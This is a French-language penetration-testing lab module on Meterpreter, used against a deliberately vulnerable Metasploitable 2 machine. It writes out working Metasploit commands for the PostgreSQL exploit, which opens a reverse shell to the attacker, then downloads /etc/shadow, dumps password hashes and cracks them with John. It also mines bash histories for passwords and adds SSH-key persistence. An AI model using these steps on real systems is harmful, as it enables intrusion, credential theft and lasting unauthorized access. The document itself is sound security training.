# Module #8 — Meterpreter : Maîtrise complète

## Informations

| Champ | Valeur |
|---|---|
| Date | 2026-05-13 |
| Cible | Metasploitable 2 (192.168.100.2) |
| Attaquant | Kali Linux (192.168.100.3) |
| Entry point | PostgreSQL (exploit #3) |
| Objectif | Maîtriser Meterpreter après obtention d'une session |

## Qu'est-ce que Meterpreter ?

Meterpreter est un payload Metasploit avancé qui s'exécute **en mémoire**
sur la cible (sans écrire de fichier sur le disque). La communication est
**chiffrée** (TLS) et bidirectionnelle.

```
Attaquant (Kali)          Cible (Metasploitable)
      |                           |
      |<--- TLS chiffré --------->|
      |    Meterpreter channel    |
      |                           |
   msfconsole              payload en RAM
```

Avantage clé : il n'écrit rien sur le disque → moins détectable qu'un
reverse shell classique.

---

## 0. Obtenir une session Meterpreter

On réutilise l'exploit PostgreSQL (exploit #3) comme point d'entrée :

```bash
use exploit/linux/postgres/postgres_payload
set RHOSTS 192.168.100.2
set USERNAME postgres
set PASSWORD postgres
set LHOST 192.168.100.3
run
```

Résultat attendu :
```
[*] Started reverse TCP handler on 192.168.100.3:4444
[*] Command Stager progress - 100%
[*] Sending stage (1017704 bytes) to 192.168.100.2
[*] Meterpreter session 1 opened
meterpreter >
```

---

## 1. Commandes de base — Reconnaissance système

### Informations système

```bash
sysinfo
```

```
Computer        : metasploitable
OS              : Linux metasploitable 2.6.24-16-server
Architecture    : x86
Meterpreter     : x86/linux
```

### Identité de l'utilisateur courant

```bash
getuid
```

```
Server username: postgres
```

> On est `postgres`, pas `root`. On verra comment escalader au module #9.

### PID du processus Meterpreter

```bash
getpid
```

```
Current pid: 4872
```

### Liste des processus en cours

```bash
ps
```

```
PID   PPID  Name        Arch  User      Path
---   ----  ----        ----  ----      ----
1     0     init        x86   root      /sbin/init
...
4872  4869  postgres    x86   postgres  /usr/lib/postgresql/...
```

Utile pour identifier des processus cibles pour `migrate`.

---

## 2. Système de fichiers

### Navigation

```bash
pwd           # répertoire courant
ls            # liste les fichiers
cd /tmp       # se déplacer
cat /etc/passwd   # lire un fichier
```

### Recherche de fichiers

```bash
search -f *.conf          # chercher tous les fichiers .conf
search -f passwd -d /etc  # chercher "passwd" dans /etc
```

### Upload — envoyer un fichier vers la cible

```bash
upload /tmp/monscript.sh /tmp/monscript.sh
```

Cas d'usage : envoyer un script d'escalade de privilège, un outil custom.

### Download — récupérer un fichier depuis la cible

```bash
download /etc/passwd /tmp/passwd_cible.txt
download /etc/shadow /tmp/shadow_cible.txt
```

> `/etc/shadow` contient les hashes des mots de passe Linux — cible prioritaire.

---

## 3. Réseau

### Interfaces réseau de la cible

```bash
ifconfig
```

```
Interface  1
============
Name         : lo
Hardware MAC : 00:00:00:00:00:00
MTU          : 16436
IPv4 Address : 127.0.0.1

Interface  2
============
Name         : eth0
Hardware MAC : 08:00:27:xx:xx:xx
MTU          : 1500
IPv4 Address : 192.168.100.2
```

### Table de routage

```bash
route
```

Utile pour identifier d'autres réseaux accessibles depuis la cible (pivot).

### Connexions réseau actives

```bash
netstat
```

Équivalent de `netstat -antp` — montre les ports ouverts et connexions en cours.

### Table ARP — machines voisines

```bash
arp
```

Permet de découvrir d'autres hôtes sur le même réseau.

---

## 4. Shell interactif

Depuis Meterpreter, on peut ouvrir un shell OS classique :

```bash
shell
```

```
Process 5021 created.
Channel 1 created.
# whoami
postgres
# id
uid=108(postgres) gid=113(postgres) groups=113(postgres),117(ssl-cert)
#
```

Pour revenir dans Meterpreter depuis le shell :

```
Ctrl+Z  (background le channel)
```

---

## 5. Hashdump — dump des mots de passe

### Linux (nécessite root ou accès à /etc/shadow)

```bash
run post/linux/gather/hashdump
```

Si on a les droits suffisants :

```
[+] Unshadowed Password File:
root:$1$xyz...:16000:0:99999:7:::
postgres:*:16000:0:99999:7:::
...
```

Les hashes récupérés peuvent être crackés avec John ou Hashcat.

### Alternative directe (si accès à shadow)

```bash
download /etc/shadow /tmp/shadow.txt
```

Puis sur Kali :

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt /tmp/shadow.txt
```

---

## 6. Gestion des sessions

### Backgrounder la session courante

```bash
background
# ou Ctrl+Z
```

Retourne dans msfconsole sans fermer la session.

### Lister les sessions ouvertes

```bash
sessions -l
```

```
Active sessions
===============

  Id  Name  Type                   Information          Connection
  --  ----  ----                   -----------          ----------
  1         meterpreter x86/linux  postgres @ metaspl.  192.168.100.3:4444 -> 192.168.100.2
```

### Reprendre une session

```bash
sessions -i 1
```

### Ouvrir plusieurs sessions

Chaque `run` d'un exploit ouvre une nouvelle session. On peut avoir
plusieurs sessions simultanées sur des machines différentes.

### Upgrade shell → Meterpreter

Si on a un shell classique (session de type `shell`) et qu'on veut le
convertir en Meterpreter :

```bash
sessions -u 1
```

---

## 7. Modules post-exploitation

Les modules `post/` s'exécutent sur une session existante.

### Suggérer des exploits de privilege escalation

```bash
run post/multi/recon/local_exploit_suggester
```

```
[*] Running checks on session 1...
[+] exploit/linux/local/... appears to be vulnerable
[+] exploit/linux/local/... appears to be vulnerable
```

Indispensable pour la suite (module #9 — Privilege Escalation).

### Informations système détaillées

```bash
run post/linux/gather/enum_system
```

Collecte : OS, hostname, interfaces, utilisateurs, crons, sudoers...

### Enum des utilisateurs

```bash
run post/linux/gather/enum_users_history
```

Récupère l'historique bash de chaque utilisateur — souvent plein de
mots de passe tapés en clair.

---

## 8. Persistence (maintenir l'accès)

> À utiliser uniquement en lab — en vrai pentest, toujours discuter avec le client.

```bash
run post/linux/manage/sshkey_persistence
```

Ajoute une clé SSH dans `~/.ssh/authorized_keys` — permet de revenir
sans relancer l'exploit.

---

## Récapitulatif des commandes essentielles

| Catégorie | Commande | Usage |
|---|---|---|
| Info système | `sysinfo` | OS, architecture |
| Identité | `getuid` | utilisateur courant |
| Processus | `ps` | liste les processus |
| Fichiers | `upload` / `download` | transfert de fichiers |
| Recherche | `search -f *.conf` | trouver des fichiers |
| Réseau | `ifconfig`, `route`, `arp` | cartographie réseau |
| Shell | `shell` | shell OS interactif |
| Hashes | `run post/linux/gather/hashdump` | dump mots de passe |
| Sessions | `sessions -l`, `sessions -i` | gérer les sessions |
| Upgrade | `sessions -u` | shell → Meterpreter |
| Post-exploit | `run post/multi/recon/local_exploit_suggester` | trouver privesc |

---

## Chaîne d'attaque complète

```
1. Exploit PostgreSQL
        ↓
2. Session Meterpreter (postgres)
        ↓
3. sysinfo / getuid / ps
        ↓
4. download /etc/passwd + /etc/shadow
        ↓
5. run post/linux/gather/enum_system
        ↓
6. run post/multi/recon/local_exploit_suggester
        ↓
7. → Module #9 : Privilege Escalation (root)
```

---

## Leçons apprises

- Meterpreter reste en mémoire — un reboot de la cible ferme la session
- Toujours noter le PID avec `getpid` — si le processus hôte se termine, la session meurt
- `background` est non-destructif : la session reste active
- Les modules `post/` sont très puissants — explorer `post/linux/gather/`
- `local_exploit_suggester` est le point de départ de toute escalade de privilège

## Références

- https://www.offsec.com/metasploit-unleashed/meterpreter-basics/
- https://www.rapid7.com/blog/post/2015/03/25/stageless-meterpreter-payloads/
- https://www.rapid7.com/db/modules/post/multi/recon/local_exploit_suggester/
